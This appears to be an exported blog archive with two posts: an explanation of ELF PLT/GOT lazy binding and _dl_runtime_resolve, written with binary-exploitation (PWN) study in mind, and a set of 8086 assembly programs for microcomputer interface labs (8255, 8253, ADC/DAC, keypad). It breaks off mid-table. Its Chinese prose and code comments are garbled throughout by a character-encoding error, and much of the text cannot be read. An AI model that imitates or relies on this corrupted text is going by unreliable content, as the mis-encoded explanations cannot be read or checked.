å¯¹PLTè¡¨å’ŒGOTè¡¨çš„æµ…æ˜¾ç†è§£\n\nä¹‹å‰åšPWNé¢˜çš„æ—¶å€™äº†è§£è¿‡ä¸€ç‚¹pltè¡¨å’Œgotè¡¨â€”â€”pltè¡¨å¯è·³è½¬åˆ°gotè¡¨ï¼Œgotè¡¨é‡Œå­˜æ”¾ç€å‡½æ•°çš„çœŸå®åœ°å€\n\nä»Šå¤©å·§åˆåœ¨ç½‘ä¸Šç¿»åˆ°ä¸€ç¯‡ç”¨gdbè°ƒè¯•pltè¡¨å’Œgotè¡¨å…³ç³»çš„åšå®¢ï¼Œè¿™æ‰å¯¹å®ƒæœ‰äº†è¿›ä¸€æ­¥çš„äº†è§£ã€‚\n\nGOTï¼ˆå…¨å±€åç§»è¡¨ï¼‰å’Œ PLT(è¿‡ç¨‹é“¾æ¥è¡¨)ï¼Œæ˜¯ä¸¤ä¸ªè¡¨ä¹‹é—´çš„äº¤äº’æ‰ä½¿å¾—å‡½æ•°å®ç°å»¶è¿Ÿç»‘å®šï¼Œé€šè¿‡è¿™ç§æ–¹æ³•å°†è¿‡ç¨‹åœ°å€çš„ç»‘å®šæ¨è¿Ÿåˆ°ç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°ã€‚\n\n### GOTè¡¨æ„æˆ\n\nä¸ºäº†å®ç°å»¶è¿Ÿç»‘å®šï¼ŒGOTçš„å¤´ä¸‰æ¡è¡¨ç›®æ˜¯ç‰¹æ®Šçš„ï¼š\n\n> GOT[0]åŒ…å«.dynamicæ®µçš„åœ°å€ï¼Œ.dynamicæ®µåŒ…å«äº†åŠ¨æ€é“¾æ¥å™¨ç”¨æ¥ç»‘å®šè¿‡ç¨‹åœ°å€çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç¬¦å·çš„ä½ç½®å’Œé‡å®šä½ä¿¡æ¯;\n>\n> GOT[1]åŒ…å«åŠ¨æ€é“¾æ¥å™¨çš„æ ‡è¯†;\n>\n> GOT[2]åŒ…å«åŠ¨æ€é“¾æ¥å™¨çš„å»¶è¿Ÿç»‘å®šä»£ç çš„å…¥å£ç‚¹ã€‚\n>\n> GOTçš„å…¶ä»–è¡¨ç›®ä¸ºæœ¬æ¨¡å—è¦å¼•ç”¨çš„ä¸€ä¸ªå…¨å±€å˜é‡æˆ–å‡½æ•°çš„åœ°å€ã€‚\n\n### PLTè¡¨æ„æˆ\n\nPLTæ˜¯ä¸€ä¸ªä»¥16å­—èŠ‚(32ä½å¹³å°ä¸­)è¡¨ç›®çš„æ•°ç»„å½¢å¼å‡ºç°çš„ä»£ç åºåˆ—ã€‚å°±åƒGOTè¡¨ï¼ŒPLTè¡¨å¹¶ä¸æ˜¯æ¯ä¸ªè¡¨é¡¹éƒ½ç”¨äºå­˜æ”¾â€œå‡½æ•°åœ°å€â€œï¼Œå…¶ä¸­PLT[0]æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è¡¨ç›®ï¼Œå®ƒè·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨ä¸­æ‰§è¡Œï¼Œæ¢å¥è¯è¯´ï¼ŒPLT[0]æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯é€šè¿‡GOT[1]å’ŒGOT[2]æ¥æ­£ç¡®ç»‘å®šä¸€ä¸ªå‡½æ•°çš„æ­£å¼åœ°å€åˆ°GOTè¡¨ä¸­æ¥ã€‚\n\n### å®ç°è¿‡ç¨‹\n\næ¯ä¸ªå®šä¹‰åœ¨å…±äº«åº“ä¸­å¹¶è¢«æœ¬æ¨¡å—è°ƒç”¨çš„å‡½æ•°åœ¨PLTä¸­éƒ½æœ‰ä¸€ä¸ªè¡¨ç›®ï¼Œä»PLT[1]å¼€å§‹ï¼æ¨¡å—å¯¹å‡½æ•°çš„è°ƒç”¨ä¼šè½¬åˆ°ç›¸åº”PLTè¡¨ç›®ä¸­æ‰§è¡Œï¼Œè¿™äº›è¡¨ç›®ç”±ä¸‰æ¡æŒ‡ä»¤æ„æˆã€‚\n\n> ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯è·³è½¬åˆ°ç›¸åº”çš„GOTå­˜å‚¨çš„åœ°å€å€¼ä¸­ï¼\n>ç¬¬äºŒæ¡æŒ‡ä»¤æŠŠå‡½æ•°ç›¸åº”çš„IDå‹å…¥æ ˆä¸­ï¼Œ\n> ç¬¬ä¸‰æ¡æŒ‡ä»¤è·³è½¬åˆ°PLT[0]ä¸­è°ƒç”¨åŠ¨æ€é“¾æ¥å™¨è§£æå‡½æ•°åœ°å€ï¼Œå¹¶æŠŠå‡½æ•°çœŸæ­£åœ°å€å­˜å…¥ç›¸åº”çš„GOTè¡¨ç›®ä¸­ã€‚\n\nè¢«è°ƒç”¨å‡½æ•°GOTç›¸åº”è¡¨ç›®ä¸­å­˜å‚¨çš„æœ€åˆåœ°å€ä¸ºç›¸åº”PLTè¡¨ç›®ä¸­ç¬¬äºŒæ¡æŒ‡ä»¤çš„åœ°å€å€¼ï¼Œå‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨åï¼GOTè¡¨ç›®ä¸­çš„å€¼å°±ä¸ºå‡½æ•°çš„çœŸæ­£åœ°å€ã€‚\n\nå› æ­¤ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°æ—¶å¼€é”€æ¯”è¾ƒå¤§ï¼ä½†æ˜¯å…¶åçš„æ¯æ¬¡è°ƒç”¨éƒ½åªä¼šèŠ±è´¹ä¸€æ¡æŒ‡ä»¤å’Œä¸€ä¸ªé—´æ¥çš„å­˜å‚¨å™¨å¼•ç”¨ã€‚\n\n------\n\næ‰€ä»¥ç¬¬ä¸€æ¬¡å‡½æ•°è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n> 1.è°ƒç”¨å‡½æ•°æ‰¾åˆ°pltè¡¨\n>\n> 2.jmp ç›¸åº”çš„gotè¡¨\n>\n> 3.push gotè¡¨çš„ä¸‹æ ‡//ç›¸åº”çš„æ ‡è¯†\n>\n> 4.jmp plt[0]\n>\n> 5.plt[0]çš„æŒ‡ä»¤è½¬å‘got[2],è¿›å…¥åŠ¨æ€è¿æ¥å™¨å…¥å£\n>\n> //ç”±äºGOT[2]ä¸­å­˜å‚¨çš„æ˜¯åŠ¨æ€é“¾æ¥å™¨çš„å…¥å£åœ°å€ï¼Œæ‰€ä»¥é€šè¿‡GOT[1]ä¸­çš„æ•°æ®ä½œä¸ºå‚æ•°ï¼Œè·³è½¬åˆ°GOT[2]æ‰€å¯¹åº”çš„å‡½æ•°å…¥å£åœ°å€ï¼Œè¿™ä¸ªåŠ¨æ€é“¾æ¥å™¨ä¼šå°†ä¸€ä¸ªå‡½æ•°çš„çœŸæ­£åœ°å€ç»‘å®šåˆ°ç›¸åº”çš„GOT[x]ä¸­\n>\n> 6.å°†çœŸæ­£çš„å‡½æ•°åœ°å€è¦†ç›–åˆ°gotè¡¨ä¸­\n\nå…¶ä¸­2ã€3ã€4æ­¥ï¼ˆjmpã€pushã€jmpï¼‰æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨æŸå‡½æ•°æ—¶è¿›è¡Œçš„ä¸‰æ­¥æ“ä½œï¼Œæ˜¯å®ç°å»¶æ—¶ç»‘å®šæœºåˆ¶çš„å…³é”®\n\nå¯ä»¥ç†è§£ä¸ºè¿™ç§çŠ¶æ€ï¼š\n\n![img](https://img-blog.csdnimg.cn/20190831142407693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsZXhZb3VuZzI4,size_16,color_FFFFFF,t_70)\n\n\n\n![image-20220410004226564](https://s2.loli.net/2022/04/10/1RqExVZ8Dl9bQsp.png)\n\næœ€åå€Ÿç”¨ä¸€ä¸‹å¤§ä½¬çš„åŠ¨å›¾ï¼š\n\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://img-blog.csdnimg.cn/20200208160601515.gif)\n\n------\n\nåæœŸè¡¥å……ï¼š\n\nå…¶å®å…·ä½“å®ç°æ¯”æƒ³è±¡çš„è¿˜è¦å¤æ‚ä¸€ä¸‹ï¼Œä¸‹é¢æ˜¯åŠ¨æ€é“¾æ¥çš„è¿‡ç¨‹ï¼Œä¹Ÿæ˜¯dl_runtime_resolveéœ€è¦æŒæ¡çš„\n\n1. dl_runtime_resolve éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ reloc_argï¼Œå°±æ˜¯å‡½æ•°è‡ªå·±çš„ plt è¡¨é¡¹ push çš„å†…å®¹ï¼Œä¸€ä¸ªæ˜¯link_mapï¼Œè¿™ä¸ªæ˜¯å…¬å…± plt è¡¨é¡¹ push è¿›æ ˆçš„ï¼Œé€šè¿‡å®ƒå¯ä»¥æ‰¾åˆ°.dynamicçš„åœ°å€\n2. è€Œ .dynamic å¯ä»¥æ‰¾åˆ° .dynstrã€.dynsymã€.rel.plt çš„è¿™äº›ä¸œè¥¿çš„åœ°å€\n3. .rel.plt çš„åœ°å€åŠ ä¸Š reloc_arg å¯ä»¥å¾—åˆ°å‡½æ•°é‡å®šä½è¡¨é¡¹ Elf32_Rel çš„æŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆå¯¹åº”çš„é‡Œé¢æ”¾ç€ r_offsetã€r_info\n4. å°† r_info>>8 å¾—åˆ°çš„å°±æ˜¯ .dynsym çš„ä¸‹æ ‡ï¼Œè¿™ä¸ªä¸‹æ ‡çš„å†…å®¹å°±æ˜¯ name_offset\n5. .dynstr+name_offset å¾—åˆ°çš„å°±æ˜¯ st_nameï¼Œè€Œ st_name å­˜æ”¾çš„å°±æ˜¯è¦è°ƒç”¨å‡½æ•°çš„å‡½æ•°å\n6. åœ¨åŠ¨æ€é“¾æ¥åº“é‡Œé¢æ‰¾è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼Œèµ‹å€¼ç»™ *rel->r_offsetï¼Œä¹Ÿå°±æ˜¯ GOT è¡¨å°±å®Œæˆäº†ä¸€æ¬¡å‡½æ•°çš„åŠ¨æ€é“¾æ¥\n\n![image-20210822212347908](https://i.loli.net/2021/08/22/xzyGeFWMm27wNO4.png)\n\n```c\ntypedef struct {\n    Elf32_Addr r_offset;    // å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ­¤å€¼ä¸ºè™šæ‹Ÿåœ°å€\n    Elf32_Word r_info;      // ç¬¦å·è¡¨ç´¢å¼•\n} Elf32_Rel;\n```\n\n`.rel.plt`èŠ‚æ˜¯ç”¨äºå‡½æ•°é‡å®šä½\n\n`.rel.dyn`èŠ‚æ˜¯ç”¨äºå˜é‡é‡å®šä½\n\n`.got`èŠ‚ä¿å­˜å…¨å±€å˜é‡åç§»è¡¨\n\n`.got.plt`èŠ‚ä¿å­˜å…¨å±€å‡½æ•°åç§»è¡¨ï¼Œå¯¹åº”ç€`Elf32_Rel`ç»“æ„ä¸­`r_offset`çš„å€¼\n\n`.dynsym`èŠ‚åŒ…å«äº†åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨\n\n`.dynstr`èŠ‚åŒ…å«äº†åŠ¨æ€é“¾æ¥çš„å­—ç¬¦ä¸²\n\n`.plt`èŠ‚æ˜¯è¿‡ç¨‹é“¾æ¥è¡¨\n","tags":["KNOWLEDGE"],"categories":["LEARNING"]},{"title":"å¾®æœºå®éªŒè®°å½•","url":"/2020/06/15/Microcomputer/","content":"\n# 0x00å‰è¨€\n\nä»Šå¤©å¾®æœºåŸç†æ¥å£ç»“è¯¾äº†ï¼Œå¥½ä¸å®¹æ˜“æ•´ç†å‡ºå®éªŒæŠ¥å‘Š\n\né¡ºä¾¿ä»¥åšå®¢çš„å½¢å¼è®°å½•ä¸€ä¸‹æœ¬å­¦æœŸ7ä¸ªå¾®æœºå®éªŒ\n\n------\n\n2020.6.19\n\nåˆšåˆšè€ƒå®Œå¾®æœºå®éªŒï¼Œè¿æ°”å¥½ï¼Œå®éªŒå¾ˆç®€å•\n\næ–‡ç« æœ€åè®°å½•ä¸€ä¸‹å®éªŒè¿‡ç¨‹\n\n------\n\n## 0x01 8255\n\n**1ï¼8255è¾“å…¥ã€è¾“å‡ºå®éªŒ**\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nSTART:\nMOV DX,28BH ï¼›åˆå§‹åŒ–8255\nMOV AL,10001001B\nOUT DX,AL\n\nTEST0:\nMOV DX,28AH ï¼›Cå£è¯»å…¥å¼€å…³çŠ¶æ€\nIN AL,DX\nMOV DX,289H ï¼›Bå£è¾“å‡º\nOUT DX,AL\nJMP TEST0 ï¼›ç»§ç»­å¾ªç¯\n\nCODE ENDS\nEND START\n```\n\n\n\n**2ï¼åˆ©ç”¨8255è®¾è®¡è·‘é©¬ç¯ï¼ˆè½¯å»¶æ—¶ï¼‰**\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nSTART:\nMOV DX,28BH ï¼›åˆå§‹åŒ–8255\nMOV AL,10001001Bï¼›æ§åˆ¶å­—\nOUT DX,AL\nMOV AH,01H ï¼›æš‚å­˜01ä½ç½®çš„ç¯\n\nTEST0:\nMOV DX,28AH ï¼›ä»Cå£è¯»å…¥å¼€å…³çŠ¶æ€\nIN AL,DX\nCMP AL,80H ï¼›å¦‚æœä¸æ˜¯K7å¼€å…³ï¼Œåˆ™å¾ªç¯ç­‰å¾…\nJNZ TEST0\n\nTEST1:\nMOV AL,AH\nMOV DX,289H ï¼›Bå£è¾“å‡º\nOUT DX,AL\nROL AL,1 ï¼›å·¦ç§»ä¸€ä½\nMOV BX,150H ï¼›ä¸¤å±‚åµŒå¥—å¾ªç¯ï¼Œè½¯å»¶æ—¶\n\nCIRCLE:\nMOV CX,65535\n\nDELAY:\nLOOP DELAY\nDEC BX\nJNZ CIRCLE\nMOV AH,AL ï¼›æš‚å­˜ç¯çš„çŠ¶æ€\nJMP TEST0ï¼›ç»§ç»­å¾ªç¯\n\nCODE ENDS\nEND START\n```\n\n------\n\n## 0x02 8253\n\n**1ï¼8253å®šæ—¶å®éªŒï¼Œåˆ©ç”¨8253å®Œæˆ2ç§’çš„å»¶æ—¶ã€‚**\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nSTART:\n;ç¬¬ä¸€çº§é€šé“2ï¼Œæ–¹å¼2ï¼Œå…ˆå†™ä½å­—èŠ‚ï¼Œåå†™é«˜å­—èŠ‚\nMOV AL ,00110101B\nMOV DX ,28BH\nOUT DX,AL\nMOV AL,00H;è®¡æ•°åˆå€¼5000\nMOV DX ,28AH\nOUT DX,AL\nMOV AL,50H\nOUT DX,AL\n;ç¬¬äºŒçº§é€šé“0ï¼Œæ–¹å¼3ï¼Œå…ˆå†™ä½å­—èŠ‚ï¼Œå†å†™é«˜å­—èŠ‚\nMOV AL,01110111B\nMOV DX,28BH\nOUT DX,AL\nMOV AL,00H;åˆå€¼800\nMOV DX,288H\nOUT DX,AL\nMOV AL,08H\nOUT DX,AL\nCODE ENDS\nEND START\n```\n\n\n\n**2ï¼åˆ©ç”¨8253ç¡¬ä»¶å»¶æ—¶æ§åˆ¶è·‘é©¬ç¯è¿è¡Œã€‚**\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nSTART:\nMOV DX,2ABHï¼›åˆå§‹åŒ–8255\nMOV AL,10001011B\nOUT DX,AL\nMOV AL,01Hï¼›æš‚å­˜ç¬¬ä¸€ä¸ªç¯ï¼Œä¿è¯èµ·å§‹ç¬¬ä¸€ä¸ªç¯äº®\nMOV BL,AL\n\nTEST0:\nMOV DX,2AAH;åˆ¤æ–­æ˜¯å¦æ˜¯å¼€å…³1\nIN AL,DX\nTEST AL,01H\nJZ TEST0\n\nTEST1:\n;ç¬¬ä¸€çº§é€šé“0ï¼Œæ–¹å¼2ï¼Œå…ˆå†™ä½å­—èŠ‚ï¼Œåå†™é«˜å­—èŠ‚\nMOV AL ,00110101B\nMOV DX ,28BH\nOUT DX,AL\nMOV AL,00H;è®¡æ•°åˆå€¼5000\nMOV DX ,28AH\nOUT DX,AL\nMOV AL,50H\nOUT DX,AL\n;ç¬¬äºŒçº§é€šé“1ï¼Œæ–¹å¼3ï¼Œå…ˆå†™ä½å­—èŠ‚ï¼Œå†å†™é«˜å­—èŠ‚\nMOV AL,01110111B\nMOV DX,28BH\nOUT DX,AL\nMOV AL,00H;åˆå€¼800\nMOV DX,288H\nOUT DX,AL\nMOV AL,08H\nOUT DX,AL\n;è„‰å†²2MHzï¼Œå‘¨æœŸ2s\nT3:\nMOV AL,BL\nMOV DX,2A8H\nOUT DX,ALï¼›è¾“å‡ºåˆ°Aå£\nROL AL,1;å·¦ç§»ä¸€ä½\nMOV BL,ALï¼›æš‚å­˜å½“å‰ç¯çš„ä½ç½®\n\nT4:\nMOV DX,2A9Hï¼›è¯»å–ä¸¤æ¬¡OUT1çŠ¶æ€ï¼Œåˆ¤æ–­ç¿»è½¬\nIN AL,DX\nMOV CL,AL\nIN AL,DX\nCMP AL,CL ï¼›æ²¡ç¿»è½¬ï¼Œç»§ç»­å¾ªç¯\nJZ T4\nJMP TEST1\n\nCODE ENDS\nEND START\n```\n\n------\n\n## 0x03 A/Dè½¬æ¢\n\n**1ï¼åˆ©ç”¨0809å®Œæˆ1ä¸ªé€šé“çš„æ¨¡æ‹Ÿé‡é‡‡é›†ï¼Œå¹¶åˆ©ç”¨8255è¾“å‡ºäºŒè¿›åˆ¶ç ã€‚**\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nSTART:\nMOV DX,283Hï¼›åˆå§‹åŒ–8255\nMOV AL,10010000B\nOUT DX,AL\n\nNEXT:\nMOV DX,29CH ï¼›è™šå†™ï¼Œå¯åŠ¨ä¸€æ¬¡è½¬æ¢\nOUT DX,AL\n\nTEST0:\nMOV DX,280H \nIN AL,DX ï¼›Aå£è¯»å…¥EOCçŠ¶æ€\nCMP AL,01H ï¼›æ£€æŸ¥ALçš„D0æ˜¯å¦ç­‰äº1ï¼Œè‹¥æ˜¯åˆ™è½¬æ¢å·²ç»ç»“æŸ\nJNZ TEST0 ï¼›å¦‚æœä¸æ˜¯ï¼Œç»§ç»­æ£€æŸ¥\n\nMOV DX,29CH\nIN AL,DX   ï¼›è¯»å…¥è½¬æ¢åçš„æ•°æ®\nMOV DX,282H\nOUT DX,AL ï¼›Cå£è¾“å‡º\nJMP NEXT\n\nCODE ENDS\nEND START\n\n```\n\n\n\n**2.åˆ©ç”¨0832äº§ç”Ÿä¸‰è§’æ³¢è¾“å‡ºï¼Œå¹¶åœ¨ç›´æµç”µæœºä¸Šè§‚å¯Ÿç»“æœã€‚**\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nBEGIN:\nMOV AL,1AH ï¼›ä¸‹é™ç”µå‹\n\nUP:\nMOV DX,290H\nOUT DX,AL\nMOV DX,291H\nOUT DX,AL\nMOV BX,20Hï¼›ä¸¤å±‚åµŒå¥—å¾ªç¯ï¼Œè½¯å»¶æ—¶\nINC ALï¼›è‡ªå¢\n\nDELAY0:\nMOV CX,65535\n\nDELAY1:\nLOOP DELAY1\nDEC BX\nJNZ DELAY0\n\nCMP AL,100 ï¼›æ¯”è¾ƒæ˜¯å¦è¾¾åˆ°ä¸Šé™å€¼\nJNZ UP ï¼›æ²¡åˆ°ç»§ç»­ä¸Šå‡\n\nDEC AL\nDOWN: \nMOV DX,290H\nOUT DX,AL\nMOV DX,291H\nOUT DX,AL\nMOV BX,20H ï¼›è½¯å»¶æ—¶\nDEC ALï¼›è‡ªå‡\n\nDELAY2:\nMOV CX,65535\n\nDELAY3:\nLOOP DELAY3\nDEC BX\nJNZ DELAY2\n\nCMP AL,19H ï¼›æ¯”è¾ƒæ˜¯å¦ä¸‹é™åˆ°ä¸‹é™å€¼\nJNZ DOWNï¼› æ²¡åˆ°ç»§ç»­ä¸‹é™\n\nJMP BEGIN\nCODE ENDS\nEND BEGIN\n```\n\n------\n\n## 0x04 é”®ç›˜\n\n**å®ç°æ‰«æé”®ç›˜ä¸Šçš„æŒ‰é”®ï¼Œå¹¶åœ¨æ•°ç ç®¡ä¸Šæ˜¾ç¤º**\n\n```assembly\nPORT_A EQU 280H\nPORT_B EQU 281H\nPORT_C EQU 282H\nPORT_CTL EQU 283H\n \nDATA SEGMENT\nTABLE DB 77H,7BH,7DH,7EH,0B7H,0BBH,0BDH,0BEH,0D7H,0DBH,0DDH,0DEH,0E7H,0EBH,0EDH,0EEH\n;TABLE1 DB 40H,79H,24H,30H,19H,12H,02H,78H,00H,18H,08H,03H,46H,21H,06H,0EH;å…±é˜´\nTABLE1 DB 0BFH,86H,0DBH,0CFH,0E6H,0EDH,0FDH,87H,0FFH,0E7H,0F7H,0FCH,0B9H, 0DEH,0F9H,0F1H\n;å…±é˜³\nDATA ENDS;æ•°æ®æ®µ\n \nSTACK SEGMENT STACK;å †æ ˆæ®µ\nDW 50 DUP(0)\nTOP_STACK LABEL WORD;TOP_STACKå®šä¹‰ä¸ºå­—ç±»å‹ï¼Œåç§»åœ°å€100\nSTACK ENDS\n\nCODE SEGMENT;ä»£ç æ®µ\n \nASSUME CS:CODE,DS:DATA,SS:STACK\nSTART:\nMOV AX,STACK\nMOV SS,AX\nLEA SP,TOP_STACK\nMOV AX,DATA\nMOV DS,AX\n;åˆå§‹åŒ–8255ï¼ŒBå£è¾“å…¥ï¼ŒA,Cå£è¾“å‡º \nMOV DX,PORT_CTL\nMOV AL,10000010B\nOUT DX,AL\nINIT:\nMOV DX,PORT_A;Aç«¯å£è¾“å‡ºä½ç”µå¹³\nMOV AL,00H\nOUT DX,AL\nMOV DX,PORT_B\n \nWAIT_OPEN:\nIN AL,DX;åˆ¤æ–­æŒ‰é”®æ˜¯å¦éƒ½æ¾å¼€\nAND AL,0FH;å–ä½å››ä½ï¼ˆåˆ—å€¼ï¼‰\nCMP AL,0FH\nJNZ WAIT_OPEN;è‹¥æœ‰é”®æ²¡æœ‰æ¾å¼€ï¼Œå°±å¾ªç¯æ£€æŸ¥\n \nWAIT_PRES:\nIN AL,DX;åˆ¤æ–­æ˜¯å¦æœ‰é”®æŒ‰ä¸‹\nAND AL,0FH;å–ä½å››ä½åˆ—å€¼\nCMP AL,0FH\nJE WAIT_PRES;è‹¥æ²¡æœ‰é”®æŒ‰ä¸‹ï¼Œåˆ™å¾ªç¯æ£€æŸ¥\n \nMOV CX,16EAH;æ¶ˆé™¤é”®æŠ–åŠ¨ï¼Œå»¶æ—¶20ms\nDELAY:LOOP DELAY\n \nIN AL,DX;å†æ¬¡æ£€æŸ¥ï¼Œçœ‹é”®æ˜¯å¦ä»è¢«å‹ç€\nAND AL,0FH\nCMP AL,0FH\nJE WAIT_PRES\n \nMOV AL,0FEH;å…ˆä½¿D0=0\nMOV CL,AL;CL=1111 1110B\n \nNEXT_ROW:\nMOV DX,PORT_A\nOUT DX,AL ;Aå£ç¬¬ä¸€è¡Œè¾“å‡ºä½ç”µå¹³\nMOV DX,PORT_B\nIN AL,DX ;Bå£è¯»å–çŠ¶æ€\nAND AL,0FH;å–ä½å››ä½åˆ—å€¼\nCMP AL,0FH\nJNE ENCODE;ä¸ä¸ºé›¶è¡¨ç¤ºæœ‰é”®æŒ‰ä¸‹ï¼Œè½¬åˆ°ENCODE\nROL CL,01;è‹¥æ— é”®æŒ‰ä¸‹ï¼Œå¾ªç¯å·¦ç§»ï¼Œä½¿ä¸‹ä¸€è¡Œè¾“å‡ºä½ç”µå¹³\nMOV AL,CL\nJMP NEXT_ROW\n \nENCODE:MOV BX,000FH;ä»ä¸‹æ ‡Få¼€å§‹\nIN AL,DX\nNEXT_TRY:CMP AL,TABLE[BX];åœ¨è¡¨ä¸­å¯»æ‰¾ä¸è¯»å…¥çš„çŠ¶æ€ç›¸ç­‰çš„å€¼\nJE DONE;è‹¥æ‰¾åˆ°åˆ™è·³è½¬DONE\nDEC BX;æ²¡æ‰¾åˆ°ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªåœ°å€\nJNS NEXT_TRY;æ²¡æœ‰å‡åˆ°0ï¼Œåˆ™å¾ªç¯æ£€æŸ¥\nMOV AH,01\nJMP EXIT;å°äºé›¶åˆ™ï¼ŒæŠ¥é”™é€€å‡º\nDONE:\nMOV AL,TABLE1[BX];åœ¨æ•°ç ç®¡è¡¨ä¸­æ‰¾åˆ°ç›¸åº”æ•°å­—\nAND AL,7FH;æ¶ˆé™¤å°æ•°ç‚¹\nMOV DX,PORT_C\nOUT DX,AL;Cå£è¾“å‡ºï¼Œæ˜¾ç¤ºåœ¨æ•°ç ç®¡ä¸Š\nJMP INIT;é‡æ–°å¾ªç¯ï¼Œè¯»å…¥ä¸‹ä¸€ä¸ªæŒ‰é”®\nEXIT:HLT\nCODE ENDS\nEND\n```\n\n------\n\n# è¿›é˜¶åŒº\n\n## 0x10 æ¥è‡ªçƒ­å¿ƒåŒå­¦å°å¼ \n\nâ€‹\tè¦æ±‚ï¼šå½“0809 é‡‡é›†æ•°æ®è¶…è¿‡4.5V æ—¶ï¼Œç”± 8253 æä¾› 0.5 ç§’æ§åˆ¶ 8255 è¾“å‡º8ä¸ªå‘å…‰äºŒæç®¡ä¸­çš„çº¢ç¯é—ªçƒã€‚å½“ä½äº4.5Væ—¶è¾“å‡ºæ­£å¸¸çš„äºŒè¿›åˆ¶å€¼ã€‚\nâ€‹\t0809 åœ°å€ä¸º 298H~29FHï¼Œ8253 0 é€šé“åœ°å€ 2A8H, 8255 æ§åˆ¶å£åœ°å€ 293Hï¼Œ 8253 é€šé“ 1 å·¥ä½œæ–¹å¼ 2ï¼Œ8253 é€šé“ 0 å·¥ä½œæ–¹å¼ 3ã€‚\n\n```assembly\nCODE SEGMENT\n ASSUME CS:CODE\n START:\n      MOV DX,293H      ;å†™å…¥8255æ§åˆ¶å£\n      MOV AL,10011001B ;æ§åˆ¶å­—ï¼ŒACè¾“å…¥Bè¾“å‡º\n      OUT DX,AL ;å†™å…¥æ§åˆ¶å­—\nL1: MOV DX,298H   ;0809æ§åˆ¶\n    OUT DX,AL     ;è™šå†™\nL2: MOV DX,292H  ;8255 Cå£ï¼Œè¯»å…¥0809çŠ¶æ€\n    IN AL,DX\n    TEST AL,01H   \n    JZ L2          ;æµ‹è¯•æ˜¯å¦å‡†å¤‡å¥½\n   \n    MOV DX,298H   ;\n    IN AL,DX ; \n   \n    CMP AL,0E6H  ;ä¸4.5Væ¯”è¾ƒ ï¼Œå°äº4.5 è·³åˆ° OUT2 è½¬æ¢äºŒè¿›åˆ¶\n    JB OUT2\n    ;8253\n    MOV DX,2ABH        ;8235æ§åˆ¶å£\n    MOV AL,01110101B   ;æ§åˆ¶å­—\n    OUT DX,AL    ;è¯»å…¥æ§åˆ¶å­—\n    MOV AL,00H ;åˆå€¼\n    MOV DX,2A9H ;1 é€šé“ 1\n    OUT DX,AL\n    MOV AL,10H ;åˆå€¼\n    MOV DX,2A9H ;1é€šé“1\n    OUT DX,AL\n    MOV DX,2ABH   ;æ§åˆ¶å£\n    MOV AL,00110111B;æ§åˆ¶å­—\n    OUT DX,AL\n    MOV AL,00H  ;åˆå€¼\n    MOV DX,2A8H ;0 é€šé“ 2\n    OUT DX,AL\n    MOV AL,10H   ;åˆå€¼\n    MOV DX,2A8H ; 0é€šé“ 2\n    OUT DX,AL\n\n  OUTO:\n    MOV DX,291H             ;8255Bå£è¾“å‡º\n    MOV AL,10011100B        ;çº¢ç¯äº®\n    OUT DX,AL\n   \n;ç¡¬å»¶æ—¶åˆ¤æ–­\n  MOV DX,290H ;Aå£è¯»å–8253çŠ¶æ€       \nLOOP1:\n  IN AL,DX\n  TEST AL,00000001B  ;æµ‹è¯•é«˜ä½ç”µé¢‘å˜åŒ–\n  JZ LOOP1\n \nLOOP2:\n  IN AL,DX\n  TEST AL,00000001B ;æµ‹è¯•é«˜ä½ç”µé¢‘å˜åŒ–\n  JNZ LOOP2\n   \n   MOV AL,00H      ;ç¯æš—\n   MOV DX,291H\n   OUT DX,AL\n;ç¡¬å»¶æ—¶\nMOV DX,290H\nLOOP3:\n  IN AL,DX\n  TEST AL,00000001B ;æµ‹è¯•é«˜ä½ç”µé¢‘\n  JZ LOOP3\n \n\nLOOP4:\n  IN AL,DX\n  TEST AL,00000001B ;æµ‹è¯•é«˜ä½ç”µé¢‘å˜åŒ–\n  JNZ LOOP4   \n  \n  MOV BX,200H\n  JMP L1  ;è·³å›ï¼Œæµ‹è¯•0809æ•°å€¼\n   \nOUT2:\n  MOV DX,291H  ;ç›´æ¥è¾“å‡ºäºŒè¿›åˆ¶\n  OUT DX,AL\n\n  JMP L1    ;è·³å›\nCODE ENDS\nEND START\n\n```\n\n------\n\n## 0x02 æ¥è‡ª[ä¸€å¶é£˜é›¶](https://skysec.top/)å­¦é•¿\n\nåˆ©ç”¨0809é‡‡é›†æ•°æ®ï¼Œè½¬æ¢åç”¨IN5æ‰“åˆ°æ•°ç ç®¡ä¸Š\n\n```assembly\nPORT_A EQU 290H\t\t;8255Aå£åœ°å€\nPORT_B EQU 291H\t\t;8255Bå£åœ°å€\nPORT_C EQU 292H\t\t;8255Cå£åœ°å€\nPORT_CTL EQU 293H\t;8255æ§åˆ¶å£åœ°å€\nDATA SEGMENT\n;æ•°ç ç®¡è¡¨,å…±é˜³ï¼ˆå®éªŒæ˜¯å…±é˜´ï¼Œæ‰€ä»¥è¦å–åï¼‰\n;           0   1   2   3   4   5   6   7\nTUBE\tDB 40H,79H,24H,30H,19H,12H,02H,78H\n;           8   9   A   B   C   D   E   F\n\t    DB 